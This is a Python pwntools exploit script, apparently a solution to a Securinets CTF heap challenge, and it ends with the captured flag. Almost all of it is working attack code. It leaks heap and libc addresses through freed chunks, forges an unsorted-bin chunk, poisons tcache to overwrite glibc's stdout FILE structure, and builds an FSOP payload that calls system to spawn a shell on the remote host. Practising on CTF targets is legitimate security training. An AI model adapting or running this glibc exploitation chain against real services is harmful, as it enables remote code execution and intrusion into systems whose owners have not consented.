#!/usr/bin/env python3

from pwn import *

exe = ELF('./main_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add(index, name, effect, cost, cooldown, element):
	sla(b"Choice: ", b"1")
	sla(b"0-31): ", f"{index}".encode())
	sa(b"name: ", name)
	sa(b"effect: ", effect)
	sla(b"cost: ", f"{cost}".encode())
	sla(b"seconds): ", f"{cooldown}".encode())
	sla(b"Choice: ", f"{element}".encode())

def edit(index, name, effect, cost, cooldown, element):
	sla(b"Choice: ", b"2")
	sla(b"0-31): ", f"{index}".encode())
	sa(b"name: ", name)
	sa(b"effect: ", effect)
	sla(b"cost: ", f"{cost}".encode())
	sla(b"seconds): ", f"{cooldown}".encode())
	sla(b"Choice: ", f"{element}".encode())

def view():
	sla(b"Choice: ", b"3")

def delete(index):
	sla(b"Choice: ", b"4")
	sla(b"0-31): ", f"{index}".encode())

def feedback(size, data):
	sla(b"Choice: ", b"5")
	sla(b"feedback: ", f"{size}".encode())
	sa(b"feedback: ", data)

script = '''
'''

p = remote("pwn-14caf623.p1.securinets.tn", 9091)
#p = process('./main_patched')
#p = gdb.debug('./main_patched', gdbscript = script)

add(0, b"0" * 8, b"0" * 0x18 + p64(0x81), 0, 0, 0)
for i in range(1, 0xb + 1):
	add(i, b"1" * 8, b"1" * 8, 1, 1, 1)

# leak heap
delete(0)
view()
rcu(b"Name: ")
heap_base = (u64(p.recv(5).ljust(8, b"\x00"))) << 12
lleak("heap_base", heap_base)

# create fake unsortebin chunk
for i in range(0xb, 0xb - 7, -1):
	delete(i)
mangle = (heap_base + 0x2d0) ^ (heap_base + 0x510) >> 12
edit(5, p64(mangle), b"2" * 8, 2, 2, 2)
add(5, b"2" * 8, b"2" * 8, 2, 2, 2)
add(13, b"2" * 8, b"2" * 0x18 + p64(0x501), 2, 2, 2)
## done, now chunk 1 is unsortedbin chunk

# leak libc
delete(1)
view()
rcu(b"Slot 1")
rcu(b"Name: ")
libc_base = (u64(p.recv(6).ljust(8, b"\x00"))) - 0x203b20
lleak("libc_base", libc_base)

# tcache dup -> tcache poisoning to stdout -> fsop
edit(1, b"3" * 0x10, b"3" * 0x8, 3, 3, 3)
edit(13, b"3" * 8, b"3" * 0x18 + p64(0x100) + b"3" * 0x10, 3, 3, 3)
delete(1)
edit(1, b"3" * 0x10, b"3" * 0x10, 3, 3, 3)
delete(1)
stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
mangle = (stdout - 0x10) ^ (heap_base + 0x320) >> 12
edit(1, p64(mangle), b"3" * 0x10, 3, 3, 3)
feedback(0xf8, b"4" * 8)

# fsop from note
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
fp = FileStructure(0)
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_ - 0x10
fp.unknown2 =  p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp)
feedback(0xf8, b"A" * 0x10 + payload)

#debug()

p.interactive()
#Securinets{2b2b12830c88c08096092ec6c07c3e47c543ef893150a4280892f867b67dba39}
